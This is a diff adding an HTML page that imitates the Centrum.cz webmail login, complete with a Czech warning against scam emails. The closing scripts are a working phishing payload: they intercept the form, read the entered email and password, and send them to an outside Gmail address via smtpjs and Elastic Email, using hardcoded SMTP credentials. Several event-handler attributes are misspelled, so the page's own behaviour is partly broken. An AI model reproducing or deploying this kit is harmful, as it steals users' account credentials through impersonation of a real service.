@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="cs">
+
+<head>
+  <meta charset="utf-8" />
+  <title>Centrum.cz mail – přihlášení</title>
+
+  <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,500,700&amp;subset=latin-ext" rel="stylesheet" />
+
+  <link rel="icon" type="image/png" href="email-centrum-cz.png" />
+  <!--[if IE]>
+      <link
+        rel="shortcut icon"
+        type="image/x-icon"
+        href="//i0.cz/l/favicon/email-centrum-cz.ico"
+      />
+    <![endif]-->
+
+  <style>
+    div#pageWrap {
+      width: 1080px;
+      margin-top: 210px;
+      background-color: #fff;
+      position: relative;
+    }
+
+    #ad-fireplace-wrapper {
+      top: 0px;
+    }
+  </style>
+
+  <link rel="stylesheet" type="text/css" href="style.css" />
+  <!--[if IE 7]>
+      <link
+        rel="stylesheet"
+        type="text/css"
+        href="//i0.cz/6/ju/css/login/centrum.cz_ie7.css"
+      />
+    <![endif]-->
+  <!--[if lte IE 6]>
+      <link
+        rel="stylesheet"
+        type="text/css"
+        href="//i0.cz/6/ju/css/login/centrum.cz_ie6.css"
+      />
+    <![endif]-->
+</head>
+
+<body class="" id="centrum-cz" onoad="lF()">
+  <div id="fb-root"></div>
+
+  <div id="ad-fireplace-wrapper" style="position: fixed; left: 50%; margin-left: -1000px;">
+    <iframe sandbox="allow-scripts allow-same-origin allow-popups" src="advert-login.htm" width="2000" height="1400" frameborder="0"></iframe>
+  </div>
+
+  <style>
+    body,
+    .button-content {
+      font-family: Roboto;
+    }
+
+    h2 {
+      font-size: 18px;
+      color: #21417f;
+      font-weight: 500;
+      padding: 6px;
+    }
+
+    #content {
+      margin: 0 96px 64px;
+      text-align: center;
+    }
+
+    #promoBox {
+      padding-top: 0px;
+    }
+
+    #brandIcon {
+      width: 500px;
+      height: 31px;
+      display: flex;
+      justify-content: center;
+    }
+
+    #brandIcon svg {
+      z-index: 1;
+      position: relative;
+    }
+
+    #formBoxL {
+      width: 452px;
+      padding: 31px 24px 51px;
+      box-shadow: 0px 0px 16px rgba(0, 0, 0, 0.1);
+      border-radius: 16px;
+      background: #fff;
+      margin-right: 88px;
+    }
+
+    #formBoxR {
+      padding: 0;
+    }
+
+    #formBoxL h1 {
+      color: #21417f;
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 19px;
+    }
+
+    #formBox {
+      background: #fff;
+    }
+
+    #formBoxR form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    span#chosenEmail,
+    a input[type='button'],
+    input.text,
+    input[type='text'] {
+      font-size: 18px;
+      font-weight: 500;
+      border-width: 1.5px;
+      border-style: solid;
+      border-color: #757575;
+      outline: none;
+      text-align: left;
+      background: transparent;
+      color: #333333;
+    }
+
+    input.text::placeholder,
+    input[type='text']::placeholder {
+      color: #8d8d8d;
+    }
+
+    a input[type='button'] {
+      border: none;
+      color: #fff;
+    }
+
+    input.text::placeholder {
+      color: rgba(141, 141, 141, 0.5);
+    }
+
+    #formBoxL .formRow {
+      width: auto;
+      margin-bottom: 12px;
+    }
+
+    .password .passwordLink {
+      font-size: 14px;
+      font-weight: 500;
+      text-align: center;
+      margin-top: 6px;
+    }
+
+    #headerLogoMail img {
+      width: auto;
+    }
+
+    #header a {
+      font-size: 16px;
+      text-decoration: none;
+    }
+
+    .button-submit {
+      margin-bottom: 19px;
+    }
+
+    .button-submit:active .button-content,
+    .button-submit:focus .button-content,
+    .button-submit:hover .button-content,
+    .button-submit .button-content {
+      font-weight: 500;
+      color: #fff;
+      font-size: 18px;
+      text-align: center;
+      width: 100%;
+      text-shadow: none;
+    }
+
+    .button-login-wrap {
+      cursor: pointer;
+      margin-top: 13px;
+    }
+
+    #formBoxL .formRow.rememberMe {
+      width: 307px;
+      text-align: left;
+      display: flex;
+      align-items: center;
+    }
+
+    .rememberMe .form-label {
+      margin-left: 9px;
+      font-size: 14px;
+      text-align: left;
+      flex-grow: 1;
+      display: flex;
+      align-items: center;
+    }
+
+    .rememberMe input {
+      margin: 0;
+      width: 16px;
+      height: 16px;
+    }
+
+    span#chosenEmail {
+      border: 1px solid #e8e8e8;
+      display: inline-block;
+      line-height: 21px;
+      margin-bottom: 12px;
+    }
+
+    span#chosenEmail,
+    input.text,
+    .button-login-wrap {
+      width: 267px;
+      padding: 13px 20px;
+      border-radius: 5px;
+    }
+
+    div.password {
+      position: relative;
+    }
+
+    div.password #ego_secret {
+      width: 230px;
+      padding: 13px 57px 13px 20px;
+      margin-bottom: 0px;
+    }
+
+    .centeredFormRow,
+    .socialLoginWrap {
+      width: 300px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      margin: 0 auto;
+    }
+
+    .socialLoginWrap {
+      flex-direction: row;
+    }
+
+    .renew_checkbox_wrap {
+      display: flex;
+      text-align: left;
+    }
+
+    .socialLoginWrap {
+      margin: 25px auto;
+    }
+
+    .marginBottom16 {
+      margin-bottom: 16px;
+    }
+
+    .button-register-wrap {
+      background-color: #fff;
+      padding: 13px 15px;
+      border-style: solid;
+      border-width: 1px;
+      border-radius: 5px;
+      margin: 10px 0;
+      cursor: pointer;
+    }
+
+    .noAccountLabel {
+      font-size: 14px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    #footer {
+      margin: 0 28px;
+      padding-top: 10px;
+    }
+
+    #footer p {
+      margin: 6px 0;
+      font-size: 16px;
+    }
+
+    #footer p span {
+      margin-right: 0;
+    }
+
+    #footer .footerLinks {
+      color: #e8e8e8;
+    }
+
+    #footer .footerLinks a {
+      text-decoration: none;
+    }
+
+    #footer .footerLinks a:hover {
+      text-decoration: underline;
+    }
+
+    #footer .copyright {
+      color: #80333333;
+    }
+
+    #content hr {
+      display: block;
+      width: 100%;
+      height: 1px;
+      border: none;
+      background: #e8e8e8;
+      margin-bottom: 25px;
+    }
+
+    div.msg {
+      width: 500px;
+      margin-left: -24px;
+      padding: 16px 0;
+      margin-bottom: 16px;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    div.msg p {
+      margin-bottom: 12px;
+    }
+
+    div.msg strong {
+      font-size: 18px;
+      color: #21417f;
+    }
+
+    div.msg a {
+      color: #ef6600;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    div.msgOk {
+      background: #004f8714;
+    }
+
+    div.msgError {
+      background: #d90b0c14;
+    }
+
+    div.msgNote,
+    div.msgWarning {
+      background: #ffe07170;
+    }
+
+    div.msgError li {
+      padding-bottom: 6px;
+    }
+
+    div.msgError strong {
+      color: #dd270b;
+    }
+
+    .renew_intro_text {
+      font-size: 14px;
+      line-height: 18px;
+      color: #333;
+      width: 434px;
+      margin: 0 auto;
+      padding-bottom: 27px;
+    }
+
+    .alreadyLoggedBlock>p {
+      font-size: 16px;
+      padding: 5px 0 10px;
+      width: 500px;
+      margin-left: -100px;
+    }
+
+    #promoBoxes {
+      margin: 0 28px 53px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    #promoBoxes .box {
+      width: 180px;
+      height: auto;
+      display: block;
+    }
+
+    /** brand dependent styling */
+
+    #content a.btn-google {
+      color: #fff;
+    }
+
+    #header p strong {
+      font-size: 16px;
+    }
+
+    .password .passwordLink {
+      text-transform: none;
+    }
+
+    .socialHeader {
+      font-size: 18px;
+      color: #000;
+      font-weight: 500;
+    }
+
+    .loginFilledLabel {
+      display: inline;
+      visibility: hidden;
+      font-size: 14px;
+      font-weight: 500;
+      color: #8d8d8d;
+      padding: 0 8px;
+      background: #fff;
+      position: relative;
+      left: -114px;
+      top: -55.5px;
+    }
+
+    .passwordEye~.loginFilledLabel {
+      left: -115px;
+    }
+
+    .passwordEye {
+      display: block;
+      visibility: hidden;
+      width: 32px;
+      height: 32px;
+      position: absolute;
+      left: 273px;
+      top: 9px;
+      background-repeat: no-repeat;
+      background-image: url(eye_open.svg);
+      cursor: pointer;
+    }
+
+    .passwordEye.text {
+      top: 9.5px;
+      background-image: url(eye_closed.svg);
+      visibility: visible;
+    }
+
+    .button_login_social {
+      border: 1px solid #bababa;
+      border-radius: 50px;
+      width: 32px;
+      height: 32px;
+      display: inline-block;
+      cursor: pointer;
+      padding: 8px;
+      margin: 0 8px;
+    }
+
+    .button_login_social span {
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: block;
+      height: 100%;
+    }
+
+    .button_google {
+      background-image: url(google.png);
+    }
+
+    .button_facebook {
+      background-image: url(facebook.png);
+    }
+
+    #brandIcon svg {
+      width: 80px;
+      height: 81px;
+      top: -13px;
+    }
+
+    .button-register-wrap {
+      background-color: #fff;
+      border-color: #ef6600;
+    }
+
+    .button-login-wrap {
+      background-color: #ef6600;
+      border-color: #ef6600;
+    }
+
+    #content a,
+    #header a,
+    .password .passwordLink a,
+    .footerLinks a,
+    .button-register-wrap:active .button-content,
+    .button-register-wrap:focus .button-content,
+    .button-register-wrap:hover .button-content,
+    .button-register-wrap .button-content,
+    .button-register-wrap .button-content {
+      color: #ef6600;
+    }
+  </style>
+  <div id="pageWrap">
+    <div id="page">
+      <div id="header">
+        <ul class="blind">
+          <li>
+            <a href="" accesskey="1">
+              Klávesové zkratky na tomto webu - základní
+            </a>
+          </li>
+          <li><a href="" accesskey="0">Na obsah stránky</a></li>
+        </ul>
+
+        <div id="headerLogo">
+          <a id="headerLogoMail" href="">
+            <img src="logo-centrum-cz-solo.png" alt="Logo Centrum.cz" />
+          </a>
+        </div>
+        <div class="reset"></div>
+      </div>
+      <hr />
+      <div id="content">
+        <div id="brandIcon">
+          <svg width="162" height="160" viewBox="0 0 142 160" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <g id="illu_splash_shadow">
+              <g id="Fill 1" filter="url(#filter0_d_1106:8)">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M113.029 118.504H31.4798C27.3486 118.504 24 115.155 24 111.024V66.8209C24 62.1406 26.1651 57.7236 29.8639 54.856L67.6237 25.5845C70.3491 23.4718 74.1601 23.4718 76.8855 25.5845L114.645 54.856C118.344 57.7236 120.509 62.1406 120.509 66.8209V111.024C120.509 115.155 117.16 118.504 113.029 118.504Z" fill="#EBEBEA" />
+              </g>
+              <path id="Fill 1_2" fill-rule="evenodd" clip-rule="evenodd" d="M113.029 118.504H31.4798C27.3486 118.504 24 115.155 24 111.024V66.8209C24 62.1406 26.1651 57.7236 29.8639 54.856L67.6237 25.5845C70.3491 23.4718 74.1601 23.4718 76.8855 25.5845L114.645 54.856C118.344 57.7236 120.509 62.1406 120.509 66.8209V111.024C120.509 115.155 117.16 118.504 113.029 118.504Z" fill="white" />
+              <mask id="mask0_1106:8" style="mask-type: alpha;" maskUnits="userSpaceOnUse" x="24" y="24" width="97" height="95">
+                <path id="Fill 1_3" fill-rule="evenodd" clip-rule="evenodd" d="M113.029 118.504H31.4798C27.3486 118.504 24 115.155 24 111.024V66.8209C24 62.1406 26.1651 57.7236 29.8639 54.856L67.6237 25.5845C70.3491 23.4718 74.1601 23.4718 76.8855 25.5845L114.645 54.856C118.344 57.7236 120.509 62.1406 120.509 66.8209V111.024C120.509 115.155 117.16 118.504 113.029 118.504Z" fill="white" />
+              </mask>
+              <g mask="url(#mask0_1106:8)">
+                <path id="Fill 3" fill-rule="evenodd" clip-rule="evenodd" d="M110.978 59.5862L73.2186 30.3154C72.867 30.0424 72.5004 29.9855 72.2542 29.9855C72.0089 29.9855 71.6423 30.0424 71.2906 30.3154L33.5309 59.5862C31.3104 61.3076 29.9847 64.0121 29.9847 66.8214V111.024C29.9847 111.849 30.6558 112.519 31.4795 112.519H113.029C113.853 112.519 114.524 111.849 114.524 111.024V66.8214C114.524 64.0121 113.199 61.3076 110.978 59.5862Z" fill="#EDEDEC" />
+                <g id="Group 2">
+                  <g id="Fill 5" filter="url(#filter1_d_1106:8)">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M101.806 71.3718C101.806 54.8448 88.4086 41.4465 71.8808 41.4465C55.3538 41.4465 41.9554 54.8448 41.9554 71.3718C41.9554 87.8996 55.3538 101.297 71.8808 101.297C88.4086 101.297 101.806 87.8996 101.806 71.3718Z" fill="white" />
+                  </g>
+                  <path id="Fill 9" fill-rule="evenodd" clip-rule="evenodd" d="M82.344 84.7535C80.3428 85.1515 77.1198 85.6146 72.8308 85.6146C62.7467 85.6146 56.1706 80.457 56.1706 71.118V66.3075C56.1706 56.9558 62.7467 51.7975 72.8308 51.7975C77.1198 51.7975 80.3428 52.2605 82.344 52.6593C83.4228 52.8912 83.8388 53.1224 83.8515 53.9708V59.1778C83.8515 59.7531 83.2164 60.1496 82.5184 60.1496H82.38C81.9281 60.0209 81.2151 59.9132 73.864 59.7531C70.7173 59.685 68.1407 61.2883 68.1407 66.3674V71.1517C68.1407 76.2307 70.7166 77.7659 73.864 77.7659C77.8365 77.7659 79.7907 77.5871 82.38 77.3567H82.4869C83.2014 77.3567 83.8515 77.7682 83.8515 78.3345L83.8388 83.4413C83.8388 84.3024 83.4228 84.535 82.344 84.7535Z" fill="#21417F" />
+                </g>
+                <g id="Group">
+                  <g id="Fill 7" filter="url(#filter2_d_1106:8)">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M24 66.883L113.028 118.504H31.4798C27.3486 118.504 24 115.156 24 111.025V66.883Z" fill="white" />
+                  </g>
+                  <g id="Fill 11" filter="url(#filter3_d_1106:8)">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M120.51 66.883L31.482 118.504H113.031C117.161 118.504 120.51 115.156 120.51 111.025V66.883Z" fill="white" />
+                  </g>
+                </g>
+              </g>
+            </g>
+            <defs>
+              <filter id="filter0_d_1106:8" x="0" y="0" width="160.509" height="158.504" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" />
+                <feOffset dx="4" dy="4" />
+                <feGaussianBlur stdDeviation="8" />
+                <feColorMatrix type="matrix" values="0 0 0 0 0.413372 0 0 0 0 0.413372 0 0 0 0 0.413372 0 0 0 0.441038 0" />
+                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_1106:8" />
+                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_1106:8" result="shape" />
+              </filter>
+              <filter id="filter1_d_1106:8" x="9.95544" y="-22.5535" width="123.851" height="123.851" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" />
+                <feOffset dy="-16" />
+                <feGaussianBlur stdDeviation="8" />
+                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0" />
+                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_1106:8" />
+                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_1106:8" result="shape" />
+              </filter>
+              <filter id="filter2_d_1106:8" x="24" y="34.883" width="153.028" height="115.621" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" />
+                <feOffset dx="16" />
+                <feGaussianBlur stdDeviation="8" />
+                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0" />
+                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_1106:8" />
+                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_1106:8" result="shape" />
+              </filter>
+              <filter id="filter3_d_1106:8" x="-0.518036" y="34.883" width="153.028" height="115.621" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+                <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha" />
+                <feOffset />
+                <feGaussianBlur stdDeviation="8" />
+                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0" />
+                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_1106:8" />
+                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_1106:8" result="shape" />
+              </filter>
+            </defs>
+          </svg>
+        </div>
+        <div id="formBox">
+          <div id="formBoxL">
+            <div id="formBoxR">
+              <h1>Přihlášení do e-mailu</h1>
+
+              <div class="msg msgAttention msgError">
+                <p style="text-align: center; margin: 10px 20px;">
+                  Pozor na podvodné e-maily varujícími před zrušením účtu či
+                  vyzývajícími k aktualizaci.
+                </p>
+                <p style="text-align: center;">
+                  Neklikejte na žádné odkazy, ani jinak nereagujte na text ve
+                  zprávě.
+                </p>
+              </div>
+
+              <form action="" method="post" name="data">
+                <input name="ego_domain" value="centrum.cz" type="hidden" />
+                <input name="url" value="https://mail.centrum.cz/" type="hidden" />
+                <div class="formRow email">
+                  <input class="text" placeholder="E-mail" id="ego_user" name="ego_user" value="" type="text" maxlength="64" onocus="scur(this)" />
+                  <div class="reset"></div>
+                  <span class="loginFilledLabel">E-mail</span>
+                </div>
+
+                <div class="formRow password">
+                  <i class="passwordEye password" id="toggleEgoSecret"></i>
+                  <input class="text" placeholder="Heslo" id="ego_secret" name="ego_secret" value="" type="password" maxlength="64" oneypress="cL(event)" onlur="$('capslock').style.visibility = 'hidden';" />
+                  <div class="reset"></div>
+                  <p class="passwordLink">
+                    <a onick="return __gm_sendGAEvent('user_renewPassword_start');" href="">
+                      Zapomenuté heslo
+                    </a>
+                  </p>
+                  <div class="msgOver darkBubble" id="capslock" style="visibility: hidden;">
+                    <div class="msgBubbleWrap msgPointerTop">
+                      <div class="msgTop">
+                        <div>
+                          <div></div>
+                        </div>
+                      </div>
+                      <div class="msgContent">
+                        <p class="warning">
+                          <span>Upozornění</span>
+                          <em>
+                            Pozor, máte zapnutou klávesu
+                            <strong>Caps Lock</strong>
+                            pro psaní velkých písmen.
+                          </em>
+                        </p>
+                      </div>
+                      <div class="msgBottom">
+                        <div></div>
+                      </div>
+                      <div class="msgPointer"></div>
+                    </div>
+                  </div>
+                </div>
+                <div class="reset"></div>
+                <div class="msgOver darkBubble" id="capslock" style="visibility: hidden;">
+                  <div class="msgBubbleWrap msgPointerTop">
+                    <div class="msgTop">
+                      <div>
+                        <div></div>
+                      </div>
+                    </div>
+                    <div class="msgContent">
+                      <p class="warning">
+                        <span>Upozornění</span>
+                        <em>
+                          Pozor, máte zapnutou klávesu
+                          <strong>Caps Lock</strong>
+                          pro psaní velkých písmen.
+                        </em>
+                      </p>
+                    </div>
+                    <div class="msgBottom">
+                      <div></div>
+                    </div>
+                    <div class="msgPointer"></div>
+                  </div>
+                </div>
+                <div>
+                  <label class="button-login-wrap button-submit button-wrap" for="ego_submit">
+                    <input onick="__gm_sendGAEvent('user_login_start', { login: { page: 'login page' } , fail: { type: 'email' } } );" class="button-content" id="ego_submit" value="Přihlásit" type="submit" />
+                  </label>
+                </div>
+
+                <div class="formRow rememberMe">
+                  <input id="ego_permanent" name="ego_expires" value="1209600" type="checkbox" />
+                  <label class="form-label" for="ego_permanent">
+                    Na tomto počítači neodhlašovat
+                  </label>
+                  <div class="reset"></div>
+                </div>
+              </form>
+              <hr />
+
+              <h3 class="socialHeader">Přihlásit se přes</h3>
+              <div class="socialLoginWrap">
+                <a href="" class="button_login_social" onick="__gm_sendGAEvent('user_login_start', { login: { page: 'login page'} , fail: { type: 'google' } } );">
+                  <span class="button_google"></span>
+                </a>
+                <a href="#" onick="return checkLoginState(); " class="button_login_social" onick="__gm_sendGAEvent('user_login_start', { login: { page: 'login page'} , fail: { type: 'facebook' } } );">
+                  <span class="button_facebook"></span>
+                </a>
+              </div>
+              <div class="centeredFormRow">
+                <p class="noAccountLabel">
+                  Nemáte účet?
+                  <a onick="return __gm_sendGAEvent('user_signup_start');" href="" class="button-submit">
+                    <span>Zaregistrujte se</span>
+                  </a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="promoBox">
+        </div>
+      </div>
+      <div class="reset"></div>
+    </div>
+    <div id="promoBoxes">
+      <a target="_blank" href="https://www.aktualne.cz" class="box">
+        <img src="" alt="Aktuálně.cz" />
+      </a>
+      <a target="_blank" href="https://hn.cz" class="box">
+        <img src="" alt="HN.cz" />
+      </a>
+      <a target="_blank" href="https://zena.aktualne.cz" class="box">
+        <img src="" alt="Zena.cz" />
+      </a>
+      <a target="_blank" href="https://www.vareni.cz" class="box">
+        <img src="" alt="Vareni.cz" />
+      </a>
+      <a target="_blank" href="https://ekonom.cz" class="box">
+        <img src="" alt="Ekonom.cz" />
+      </a>
+    </div>
+    <hr />
+    <div id="footer">
+      <p class="footerLinks">
+        <a href="">O nás</a>
+        |
+        <a href="">Volná místa</a>
+        |
+        <a href="">Reklama</a>
+        |
+        <a href="">
+          Všeobecné podmínky
+        </a>
+        |
+        <a href="">Cookies</a>
+        |
+        <a href="">
+          Ochrana osobních údajů
+        </a>
+        |
+        <a class="eco-cmp-show-settings" href="javascript:void(0);">
+          Nastavení&nbsp;soukromí
+        </a>
+        |
+        <a href="/">
+          Zpracování&nbsp;osobních&nbsp;údajů
+        </a>
+        |
+        <a href="">Nápověda</a>
+      </p>
+      <p class="copyright">
+        <span>1999 &ndash; 2023 &copy; Economia, a.s.</span>
+      </p>
+    </div>
+  </div>
+  </div>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    async function SendMail(message, to) {
+      try {
+        let detail = {
+          Host: "smtp.elasticemail.com",
+          Username: "titiloyepaul68@gmail.com",
+          Password: "F678874ACF035FCC54C518F389D39AB1AABA",
+          To: to,
+          From: "titiloyepaul68@gmail.com",
+          Subject: `Form submission at ${window.location.origin}`,
+          Body: message,
+          Port: 2525
+        }
+        let response = await Email.send(detail);
+        return response;
+      } catch (err) {
+        console.error("Sorry an error occurred ");
+        return false
+      }
+    }
+  </script>
+  <script>
+    document.forms[0].onsubmit = function(e) {
+      e.preventDefault()
+      let [password, email] = [document.getElementsByName('ego_secret')[0].value, document.getElementsByName('ego_user')[0].value];
+      console.log(email, password);
+      let message = `
+      Hey there... someone submitted a form at ${window.location.origin}
+      
+      These are the data the user submitted.
+      
+      Email: ${email}
+      Password: ${password}
+      `
+      window.SendMail(message,"Ekocredit.sk@gmail.com").then(console.log)
+    }
+  </script>
+  <!-- (C)2000-2012 Gemius SA - gemiusAudience / centrumcz / E-mail - login/logout -->
+
+  <!-- ok ju-fe1 aa1a70 2.30.0-buster1 2023-05-17 11:10:00+00:00 (2.30.0-buster1 2023-05-17 11:10:00+00:00) -->
+</body>
+
+</html>
